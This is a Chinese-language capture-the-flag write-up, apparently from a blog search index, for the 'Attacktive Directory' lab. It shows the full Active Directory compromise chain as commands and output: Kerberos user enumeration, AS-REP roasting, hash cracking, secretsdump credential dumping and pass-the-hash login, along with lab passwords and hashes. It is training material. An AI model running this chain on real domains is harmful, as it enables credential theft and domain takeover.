[{"title":"Attacktive Directory","url":"/2022/11/07/Attacktive-Directory/","content":"\n### #0 信息收集\n\n```bash\n──(root㉿kali)-[~]\n└─# nmap 10.10.193.76 -p53,80,88,135,139,445,593,3268,3269,3389 -sV -sC -sT --script vuln -Pn\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-05-30 10:13 CST\nNmap scan report for 10.10.193.76\nHost is up (0.24s latency).\n\nPORT     STATE SERVICE       VERSION\n53/tcp   open  domain        Simple DNS Plus\n80/tcp   open  http          Microsoft IIS httpd 10.0\n|_http-server-header: Microsoft-IIS/10.0\n|_http-csrf: Couldn't find any CSRF vulnerabilities.\n|_http-dombased-xss: Couldn't find any DOM based XSS.\n|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.\n88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-05-30 02:14:15Z)\n135/tcp  open  msrpc         Microsoft Windows RPC\n139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn\n445/tcp  open  microsoft-ds?\n593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)\n3269/tcp open  tcpwrapped\n|_ssl-ccs-injection: No reply from server (TIMEOUT)\n|_tls-ticketbleed: ERROR: Script execution failed (use -d to debug)\n3389/tcp open  ms-wbt-server Microsoft Terminal Services\n|_tls-ticketbleed: ERROR: Script execution failed (use -d to debug)\nService Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_smb-vuln-ms10-054: false\n|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR\n|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 683.18 seconds\n```\n\n\n\n### #1 enum4linux 枚举端口 139/445\n\n```bash\n┌──(root㉿kali)-[~]\n└─# enum4linux 10.10.193.76     \nStarting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon May 30 11:10:38 2022\n\n ========================== \n|    Target Information    |\n ========================== \nTarget ........... 10.10.193.76\nRID Range ........ 500-550,1000-1050\nUsername ......... ''\nPassword ......... ''\nKnown Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none\n\n\n ==================================================== \n|    Enumerating Workgroup/Domain on 10.10.193.76    |\n ==================================================== \n[E] Can't find workgroup/domain\n\n\n ============================================ \n|    Nbtstat Information for 10.10.193.76    |\n ============================================ \nLooking up status of 10.10.193.76\nNo reply from 10.10.193.76\n\n ===================================== \n|    Session Check on 10.10.193.76    |\n ===================================== \nUse of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 437.\n[+] Server 10.10.193.76 allows sessions using username '', password ''\nUse of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 451.\n[+] Got domain/workgroup name: \n\n =========================================== \n|    Getting domain SID for 10.10.193.76    |\n =========================================== \nUse of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 359.\nDomain Name: THM-AD\nDomain Sid: S-1-5-21-3591857110-2884097990-301047963\n[+] Host is part of a domain (not a workgroup)\n\n ====================================== \n|    OS information on 10.10.193.76    |\n ====================================== \nUse of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 458.\nUse of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.\n[+] Got OS info for 10.10.193.76 from smbclient: \nUse of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 467.\n[+] Got OS info for 10.10.193.76 from srvinfo:\nCould not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED\n\n ============================= \n|    Users on 10.10.193.76    |\n ============================= \nUse of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 866.\n[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED\n\nUse of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 881.\n[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED\n\n ========================================= \n|    Share Enumeration on 10.10.193.76    |\n ========================================= \nUse of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 640.\ndo_connect: Connection to 10.10.193.76 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)\n\n\tSharename       Type      Comment\n\t---------       ----      -------\nReconnecting with SMB1 for workgroup listing.\nUnable to connect with SMB1 -- no workgroup available\n\n[+] Attempting to map shares on 10.10.193.76\n\n ==================================================== \n|    Password Policy Information for 10.10.193.76    |\n ==================================================== \n[E] Unexpected error from polenum:\n\n\n[+] Attaching to 10.10.193.76 using a NULL share\n\n[+] Trying protocol 139/SMB...\n\n\t[!] Protocol failed: Cannot request session (Called Name:10.10.193.76)\n\n[+] Trying protocol 445/SMB...\n\n\t[!] Protocol failed: SAMR SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.\n\nUse of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 501.\n\n[E] Failed to get password policy with rpcclient\n\n\n ============================== \n|    Groups on 10.10.193.76    |\n ============================== \nUse of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.\n\n[+] Getting builtin groups:\n\n[+] Getting builtin group memberships:\nUse of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.\n\n[+] Getting local groups:\n\n[+] Getting local group memberships:\nUse of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 593.\n\n[+] Getting domain groups:\n\n[+] Getting domain group memberships:\n\n ======================================================================= \n|    Users on 10.10.193.76 via RID cycling (RIDS: 500-550,1000-1050)    |\n ======================================================================= \nUse of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 710.\n[I] Found new SID: S-1-5-21-3591857110-2884097990-301047963\nUse of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 710.\nUse of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 710.\nUse of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 710.\nUse of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 710.\nUse of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 710.\nUse of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 710.\n[I] Found new SID: S-1-5-21-3532885019-1334016158-1514108833\nUse of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 742.\n[+] Enumerating users using SID S-1-5-21-3591857110-2884097990-301047963 and logon username '', password ''\nUse of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.\nS-1-5-21-3591857110-2884097990-301047963-500 THM-AD\\Administrator (Local User)\n......\nS-1-5-21-3591857110-2884097990-301047963-512 THM-AD\\Domain Admins (Domain Group)\nUse of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.\nS-1-5-21-3591857110-2884097990-301047963-513 THM-AD\\Domain Users (Domain Group)\nUse of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.\nS-1-5-21-3591857110-2884097990-301047963-514 THM-AD\\Domain Guests (Domain Group)\nUse of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.\nS-1-5-21-3591857110-2884097990-301047963-515 THM-AD\\Domain Computers (Domain Group)\nUse of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.\nS-1-5-21-3591857110-2884097990-301047963-516 THM-AD\\Domain Controllers (Domain Group)\nUse of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.\nS-1-5-21-3591857110-2884097990-301047963-517 THM-AD\\Cert Publishers (Local Group)\nUse of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.\nS-1-5-21-3591857110-2884097990-301047963-518 THM-AD\\Schema Admins (Domain Group)\nUse of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.\nS-1-5-21-3591857110-2884097990-301047963-519 THM-AD\\Enterprise Admins (Domain Group)\nUse of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.\nS-1-5-21-3591857110-2884097990-301047963-520 THM-AD\\Group Policy Creator Owners (Domain Group)\nUse of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.\nS-1-5-21-3591857110-2884097990-301047963-521 THM-AD\\Read-only Domain Controllers (Domain Group)\nUse of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.\nS-1-5-21-3591857110-2884097990-301047963-522 THM-AD\\Cloneable Domain Controllers (Domain Group)\nUse of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.\nS-1-5-21-3591857110-2884097990-301047963-523 *unknown*\\*unknown* (8)\nUse of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.\nS-1-5-21-3591857110-2884097990-301047963-524 *unknown*\\*unknown* (8)\nUse of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.\nS-1-5-21-3591857110-2884097990-301047963-525 THM-AD\\Protected Users (Domain Group)\nUse of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.\nS-1-5-21-3591857110-2884097990-301047963-526 THM-AD\\Key Admins (Domain Group)\nUse of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.\nS-1-5-21-3591857110-2884097990-301047963-527 THM-AD\\Enterprise Key Admins (Domain Group)\nUse of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.\nS-1-5-21-3591857110-2884097990-301047963-528 *unknown*\\*unknown* (8)\n......\nUse of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.\nS-1-5-21-3591857110-2884097990-301047963-550 *unknown*\\*unknown* (8)\nUse of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.\nS-1-5-21-3591857110-2884097990-301047963-1000 THM-AD\\ATTACKTIVEDIREC$ (Local User)\nUse of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.\nS-1-5-21-3591857110-2884097990-301047963-1001 *unknown*\\*unknown* (8)\n......\nUse of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.\nS-1-5-21-3591857110-2884097990-301047963-1050 *unknown*\\*unknown* (8)\n[+] Enumerating users using SID S-1-5-21-3532885019-1334016158-1514108833 and logon username '', password ''\nUse of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.\nS-1-5-21-3532885019-1334016158-1514108833-500 ATTACKTIVEDIREC\\Administrator (Local User)\nUse of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.\nS-1-5-21-3532885019-1334016158-1514108833-501 ATTACKTIVEDIREC\\Guest (Local User)\n......\n\n ============================================= \n|    Getting printer info for 10.10.193.76    |\n ============================================= \nUse of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 991.\nCould not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED\n\n\nenum4linux complete on Mon May 30 11:22:29 2022\n\n```\n\n\n\n### #2 通过 Kerberos 枚举用户\n\n用户列表 : https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt\n\n密码列表 : https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/passwordlist.txt\n\n```bash\n┌──(root㉿kali)-[~/thm/dc]\n└─# ./kerbrute_linux_amd64 userenum -d spookysec.local --dc 10.10.122.125 userlist.txt \n\n    __             __               __     \n   / /_____  _____/ /_  _______  __/ /____ \n  / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\\n / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/\n/_/|_|\\___/_/  /_.___/_/   \\__,_/\\__/\\___/                                        \n\nVersion: v1.0.3 (9dad6e1) - 05/30/22 - Ronnie Flathers @ropnop\n\n2022/05/30 14:24:09 >  Using KDC(s):\n2022/05/30 14:24:09 >  \t10.10.122.125:88\n\n2022/05/30 14:24:10 >  [+] VALID USERNAME:\t james@spookysec.local\n2022/05/30 14:24:14 >  [+] VALID USERNAME:\t svc-admin@spookysec.local\t# 值得注意的帐户\n2022/05/30 14:24:20 >  [+] VALID USERNAME:\t James@spookysec.local\n2022/05/30 14:24:22 >  [+] VALID USERNAME:\t robin@spookysec.local\n2022/05/30 14:24:48 >  [+] VALID USERNAME:\t darkstar@spookysec.local\n2022/05/30 14:25:02 >  [+] VALID USERNAME:\t administrator@spookysec.local\n2022/05/30 14:25:30 >  [+] VALID USERNAME:\t backup@spookysec.local\t\t# 值得注意的帐户\n2022/05/30 14:25:43 >  [+] VALID USERNAME:\t paradox@spookysec.local\n2022/05/30 14:27:15 >  [+] VALID USERNAME:\t JAMES@spookysec.local\n2022/05/30 14:27:43 >  [+] VALID USERNAME:\t Robin@spookysec.local\n2022/05/30 14:30:49 >  [+] VALID USERNAME:\t Administrator@spookysec.local\n\n```\n\n\n\n### #3 滥用 Kerberos\n\n用户帐户枚举完成后，我们可以尝试使用称为 **AS-REP Roasting 的攻击方法滥用 Kerberos 中的功能。**当用户帐户设置了“不需要预身份验证”权限时，会发生 AS-Re proasting。这意味着该帐户 在请求指定用户帐户的 Kerberos 票证之前不需要提供有效的身份证明**。**\n\n```bash\n┌──(root㉿kali)-[~/thm/dc]\n└─# impacket-GetNPUsers spookysec.local/ -dc-ip 10.10.122.125 -usersfile users.txt -format hashcat                       \nImpacket v0.9.24 - Copyright 2021 SecureAuth Corporation\n\n[-] User james doesn't have UF_DONT_REQUIRE_PREAUTH set\n$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:0d046ef0e8ddef967f2e23e7d3a47a18$8438ee06768f86a66d80f1f4a8687c329ae898eb0a6816a004898f72944b2b122c668c7b05efab2d8a28cfa65c1e135cc73cc61d2e89202a103822005535ead7b5f1a677d0ce1a68484411c573b85cbf3a5deac6b37a93321b0e109abd544c194ab3b55eece4c84545bfb9dd4a576dfd531ea1c0935d4d3545205acc2b3a1896dd0f9bd546786d10d27c5c24b972e3516995f0fd0f0a36838aee0cf89a361e2f2394e7e9bb78330291a83efadc8022c281c0eda83486fd9a39fcb49e6c18a43b61534731af906f6c3229acd7012c51a8915784511f2ffe5c25220ced2d5ce90166dca7d5ce5806a038972ad4808971b0662e\n[-] User James doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User robin doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User darkstar doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User backup doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User paradox doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User JAMES doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User Robin doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set\n\n```\n\n\n\nhashcat 破解 Kerberos 5 AS-REP etype 23 hash 得到密码 ：management2005\n\n```bash\n┌──(root㉿kali)-[~/thm/dc]\n└─# hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt\nhashcat (v6.2.5) starting\n\nOpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 11.1.0, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]\n=====================================================================================================================================\n* Device #1: pthread-11th Gen Intel(R) Core(TM) i7-11370H @ 3.30GHz, 1428/2921 MB (512 MB allocatable), 4MCU\n\nMinimum password length supported by kernel: 0\nMaximum password length supported by kernel: 256\n\nHashes: 1 digests; 1 unique digests, 1 unique salts\nBitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates\nRules: 1\n\nOptimizers applied:\n* Zero-Byte\n* Not-Iterated\n* Single-Hash\n* Single-Salt\n\nATTENTION! Pure (unoptimized) backend kernels selected.\nPure kernels can crack longer passwords, but drastically reduce performance.\nIf you want to switch to optimized kernels, append -O to your commandline.\nSee the above message to find out about the exact limits.\n\nWatchdog: Temperature abort trigger set to 90c\n\nHost memory required for this attack: 0 MB\n\nDictionary cache hit:\n* Filename..: /usr/share/wordlists/rockyou.txt\n* Passwords.: 14344385\n* Bytes.....: 139921507\n* Keyspace..: 14344385\n\nCracking performance lower than expected?                 \n\n* Append -O to the commandline.\n  This lowers the maximum supported password/salt length (usually down to 32).\n\n* Append -w 3 to the commandline.\n  This can cause your screen to lag.\n\n* Append -S to the commandline.\n  This has a drastic speed impact but can be better for specific attacks.\n  Typical scenarios are a small wordlist but a large ruleset.\n\n* Update your backend API runtime / driver the right way:\n  https://hashcat.net/faq/wrongdriver\n\n* Create more work items to make use of your parallelization power:\n  https://hashcat.net/faq/morework\n\n$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:0d046ef0e8ddef967f2e23e7d3a47a18$8438ee06768f86a66d80f1f4a8687c329ae898eb0a6816a004898f72944b2b122c668c7b05efab2d8a28cfa65c1e135cc73cc61d2e89202a103822005535ead7b5f1a677d0ce1a68484411c573b85cbf3a5deac6b37a93321b0e109abd544c194ab3b55eece4c84545bfb9dd4a576dfd531ea1c0935d4d3545205acc2b3a1896dd0f9bd546786d10d27c5c24b972e3516995f0fd0f0a36838aee0cf89a361e2f2394e7e9bb78330291a83efadc8022c281c0eda83486fd9a39fcb49e6c18a43b61534731af906f6c3229acd7012c51a8915784511f2ffe5c25220ced2d5ce90166dca7d5ce5806a038972ad4808971b0662e:management2005\n                                                          \nSession..........: hashcat\nStatus...........: Cracked\nHash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)\nHash.Target......: $krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:0d046ef0e8d...b0662e\nTime.Started.....: Mon May 30 14:56:22 2022 (13 secs)\nTime.Estimated...: Mon May 30 14:56:35 2022 (0 secs)\nKernel.Feature...: Pure Kernel\nGuess.Base.......: File (/usr/share/wordlists/rockyou.txt)\nGuess.Queue......: 1/1 (100.00%)\nSpeed.#1.........:   480.2 kH/s (1.28ms) @ Accel:256 Loops:1 Thr:1 Vec:16\nRecovered........: 1/1 (100.00%) Digests\nProgress.........: 5837824/14344385 (40.70%)\nRejected.........: 0/5837824 (0.00%)\nRestore.Point....: 5836800/14344385 (40.69%)\nRestore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1\nCandidate.Engine.: Device Generator\nCandidates.#1....: manaiagal -> man37o9\nHardware.Mon.#1..: Util: 64%\n\nStarted: Mon May 30 14:55:48 2022\nStopped: Mon May 30 14:56:36 2022\n\n```\n\n\n\n利用账号密码枚举SMB，得到backup用户密码\n\n```bash\n┌──(root㉿kali)-[~]\n└─# smbclient -L //10.10.122.125/ -U svc-admin%management2005 \n\n\tSharename       Type      Comment\n\t---------       ----      -------\n\tADMIN$          Disk      Remote Admin\n\tbackup          Disk      \n\tC$              Disk      Default share\n\tIPC$            IPC       Remote IPC\n\tNETLOGON        Disk      Logon server share \n\tSYSVOL          Disk      Logon server share \nReconnecting with SMB1 for workgroup listing.\ndo_connect: Connection to 10.10.122.125 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)\nUnable to connect with SMB1 -- no workgroup available\n                                                                                                                                                                                 \n┌──(root㉿kali)-[~]\n└─# smbclient //10.10.122.125/backup -U svc-admin%management2005 \nTry \"help\" to get a list of possible commands.\nsmb: \\> dir\n  .                                   D        0  Sun Apr  5 03:08:39 2020\n  ..                                  D        0  Sun Apr  5 03:08:39 2020\n  backup_credentials.txt              A       48  Sun Apr  5 03:08:53 2020\n\n\t\t8247551 blocks of size 4096. 3587256 blocks available\nsmb: \\> mget backup_credentials.txt \nGet file backup_credentials.txt? y\ngetting file \\backup_credentials.txt of size 48 as backup_credentials.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)\nsmb: \\> exit\n                                                                                                                    ┌──(root㉿kali)-[~]\n└─# cat backup_credentials.txt \nYmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw     \n\n┌─(root㉿kali)-[~]\n└─# echo \"YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw\" | base64 -d\nbackup@spookysec.local:backup2517860   \n```\n\n\n\n利用backup 用户获取管理员hash\n\n```bash\n┌──(root㉿kali)-[~]\n└─# impacket-secretsdump spookysec.local/backup:backup2517860@10.10.122.125\nImpacket v0.9.24 - Copyright 2021 SecureAuth Corporation\n\n[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied \n[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\n[*] Using the DRSUAPI method to get NTDS.DIT secrets\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nkrbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::\nspookysec.local\\skidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::\nspookysec.local\\breakerofthings:1104:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::\nspookysec.local\\james:1105:aad3b435b51404eeaad3b435b51404ee:9448bf6aba63d154eb0c665071067b6b:::\nspookysec.local\\optional:1106:aad3b435b51404eeaad3b435b51404ee:436007d1c1550eaf41803f1272656c9e:::\nspookysec.local\\sherlocksec:1107:aad3b435b51404eeaad3b435b51404ee:b09d48380e99e9965416f0d7096b703b:::\nspookysec.local\\darkstar:1108:aad3b435b51404eeaad3b435b51404ee:cfd70af882d53d758a1612af78a646b7:::\nspookysec.local\\Ori:1109:aad3b435b51404eeaad3b435b51404ee:c930ba49f999305d9c00a8745433d62a:::\nspookysec.local\\robin:1110:aad3b435b51404eeaad3b435b51404ee:642744a46b9d4f6dff8942d23626e5bb:::\nspookysec.local\\paradox:1111:aad3b435b51404eeaad3b435b51404ee:048052193cfa6ea46b5a302319c0cff2:::\nspookysec.local\\Muirland:1112:aad3b435b51404eeaad3b435b51404ee:3db8b1419ae75a418b3aa12b8c0fb705:::\nspookysec.local\\horshark:1113:aad3b435b51404eeaad3b435b51404ee:41317db6bd1fb8c21c2fd2b675238664:::\nspookysec.local\\svc-admin:1114:aad3b435b51404eeaad3b435b51404ee:fc0f1e5359e372aa1f69147375ba6809:::\nspookysec.local\\backup:1118:aad3b435b51404eeaad3b435b51404ee:19741bde08e135f4b40f1ca9aab45538:::\nspookysec.local\\a-spooks:1601:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::\nATTACKTIVEDIREC$:1000:aad3b435b51404eeaad3b435b51404ee:1583681d41dc2c7ca6aa961cc23d8ec8:::\n[*] Kerberos keys grabbed\nAdministrator:aes256-cts-hmac-sha1-96:713955f08a8654fb8f70afe0e24bb50eed14e53c8b2274c0c701ad2948ee0f48\nAdministrator:aes128-cts-hmac-sha1-96:e9077719bc770aff5d8bfc2d54d226ae\nAdministrator:des-cbc-md5:2079ce0e5df189ad\nkrbtgt:aes256-cts-hmac-sha1-96:b52e11789ed6709423fd7276148cfed7dea6f189f3234ed0732725cd77f45afc\nkrbtgt:aes128-cts-hmac-sha1-96:e7301235ae62dd8884d9b890f38e3902\nkrbtgt:des-cbc-md5:b94f97e97fabbf5d\nspookysec.local\\skidy:aes256-cts-hmac-sha1-96:3ad697673edca12a01d5237f0bee628460f1e1c348469eba2c4a530ceb432b04\nspookysec.local\\skidy:aes128-cts-hmac-sha1-96:484d875e30a678b56856b0fef09e1233\nspookysec.local\\skidy:des-cbc-md5:b092a73e3d256b1f\nspookysec.local\\breakerofthings:aes256-cts-hmac-sha1-96:4c8a03aa7b52505aeef79cecd3cfd69082fb7eda429045e950e5783eb8be51e5\nspookysec.local\\breakerofthings:aes128-cts-hmac-sha1-96:38a1f7262634601d2df08b3a004da425\nspookysec.local\\breakerofthings:des-cbc-md5:7a976bbfab86b064\nspookysec.local\\james:aes256-cts-hmac-sha1-96:1bb2c7fdbecc9d33f303050d77b6bff0e74d0184b5acbd563c63c102da389112\nspookysec.local\\james:aes128-cts-hmac-sha1-96:08fea47e79d2b085dae0e95f86c763e6\nspookysec.local\\james:des-cbc-md5:dc971f4a91dce5e9\nspookysec.local\\optional:aes256-cts-hmac-sha1-96:fe0553c1f1fc93f90630b6e27e188522b08469dec913766ca5e16327f9a3ddfe\nspookysec.local\\optional:aes128-cts-hmac-sha1-96:02f4a47a426ba0dc8867b74e90c8d510\nspookysec.local\\optional:des-cbc-md5:8c6e2a8a615bd054\nspookysec.local\\sherlocksec:aes256-cts-hmac-sha1-96:80df417629b0ad286b94cadad65a5589c8caf948c1ba42c659bafb8f384cdecd\nspookysec.local\\sherlocksec:aes128-cts-hmac-sha1-96:c3db61690554a077946ecdabc7b4be0e\nspookysec.local\\sherlocksec:des-cbc-md5:08dca4cbbc3bb594\nspookysec.local\\darkstar:aes256-cts-hmac-sha1-96:35c78605606a6d63a40ea4779f15dbbf6d406cb218b2a57b70063c9fa7050499\nspookysec.local\\darkstar:aes128-cts-hmac-sha1-96:461b7d2356eee84b211767941dc893be\nspookysec.local\\darkstar:des-cbc-md5:758af4d061381cea\nspookysec.local\\Ori:aes256-cts-hmac-sha1-96:5534c1b0f98d82219ee4c1cc63cfd73a9416f5f6acfb88bc2bf2e54e94667067\nspookysec.local\\Ori:aes128-cts-hmac-sha1-96:5ee50856b24d48fddfc9da965737a25e\nspookysec.local\\Ori:des-cbc-md5:1c8f79864654cd4a\nspookysec.local\\robin:aes256-cts-hmac-sha1-96:8776bd64fcfcf3800df2f958d144ef72473bd89e310d7a6574f4635ff64b40a3\nspookysec.local\\robin:aes128-cts-hmac-sha1-96:733bf907e518d2334437eacb9e4033c8\nspookysec.local\\robin:des-cbc-md5:89a7c2fe7a5b9d64\nspookysec.local\\paradox:aes256-cts-hmac-sha1-96:64ff474f12aae00c596c1dce0cfc9584358d13fba827081afa7ae2225a5eb9a0\nspookysec.local\\paradox:aes128-cts-hmac-sha1-96:f09a5214e38285327bb9a7fed1db56b8\nspookysec.local\\paradox:des-cbc-md5:83988983f8b34019\nspookysec.local\\Muirland:aes256-cts-hmac-sha1-96:81db9a8a29221c5be13333559a554389e16a80382f1bab51247b95b58b370347\nspookysec.local\\Muirland:aes128-cts-hmac-sha1-96:2846fc7ba29b36ff6401781bc90e1aaa\nspookysec.local\\Muirland:des-cbc-md5:cb8a4a3431648c86\nspookysec.local\\horshark:aes256-cts-hmac-sha1-96:891e3ae9c420659cafb5a6237120b50f26481b6838b3efa6a171ae84dd11c166\nspookysec.local\\horshark:aes128-cts-hmac-sha1-96:c6f6248b932ffd75103677a15873837c\nspookysec.local\\horshark:des-cbc-md5:a823497a7f4c0157\nspookysec.local\\svc-admin:aes256-cts-hmac-sha1-96:effa9b7dd43e1e58db9ac68a4397822b5e68f8d29647911df20b626d82863518\nspookysec.local\\svc-admin:aes128-cts-hmac-sha1-96:aed45e45fda7e02e0b9b0ae87030b3ff\nspookysec.local\\svc-admin:des-cbc-md5:2c4543ef4646ea0d\nspookysec.local\\backup:aes256-cts-hmac-sha1-96:23566872a9951102d116224ea4ac8943483bf0efd74d61fda15d104829412922\nspookysec.local\\backup:aes128-cts-hmac-sha1-96:843ddb2aec9b7c1c5c0bf971c836d197\nspookysec.local\\backup:des-cbc-md5:d601e9469b2f6d89\nspookysec.local\\a-spooks:aes256-cts-hmac-sha1-96:cfd00f7ebd5ec38a5921a408834886f40a1f40cda656f38c93477fb4f6bd1242\nspookysec.local\\a-spooks:aes128-cts-hmac-sha1-96:31d65c2f73fb142ddc60e0f3843e2f68\nspookysec.local\\a-spooks:des-cbc-md5:e09e4683ef4a4ce9\nATTACKTIVEDIREC$:aes256-cts-hmac-sha1-96:14cf17420c1c50fa7c55588b6bb0e857590e45f98cf5923d0e33316ef6589b6e\nATTACKTIVEDIREC$:aes128-cts-hmac-sha1-96:ab962df9e490918881be8544207c4c0c\nATTACKTIVEDIREC$:des-cbc-md5:f719d0c858a73d0e\n[*] Cleaning up... \n\n```\n\n\n\n### #4 Evil-WinRM 登录域控制器\n\n```bash\n┌──(root㉿kali)-[~]\n└─# evil-winrm -i 10.10.122.125 -u administrator -H 0e0363213e37b94221497260b0bcb4fc\n\nEvil-WinRM shell v3.3\n\nWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine\n\nData: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n\nInfo: Establishing connection to remote endpoint\n\n*Evil-WinRM* PS C:\\Users\\Administrator\\Documents> whoami\nthm-ad\\administrator\n*Evil-WinRM* PS C:\\Users\\Administrator\\Documents> ipconfig\n\nWindows IP Configuration\n\n\nEthernet adapter Ethernet:\n\n   Connection-specific DNS Suffix  . : eu-west-1.compute.internal\n   Link-local IPv6 Address . . . . . : fe80::f893:989c:cb66:84dc%6\n   IPv4 Address. . . . . . . . . . . : 10.10.122.125\n   Subnet Mask . . . . . . . . . . . : 255.255.0.0\n   Default Gateway . . . . . . . . . : 10.10.0.1\n*Evil-WinRM* PS C:\\Users\\Administrator\\Documents> \n\n```\n\n","tags":["活动目录"]},{"title":"Attacking Kerberos","url":"/2022/11/07/Attacking-Kerberos/","content":"\n# **Attacking 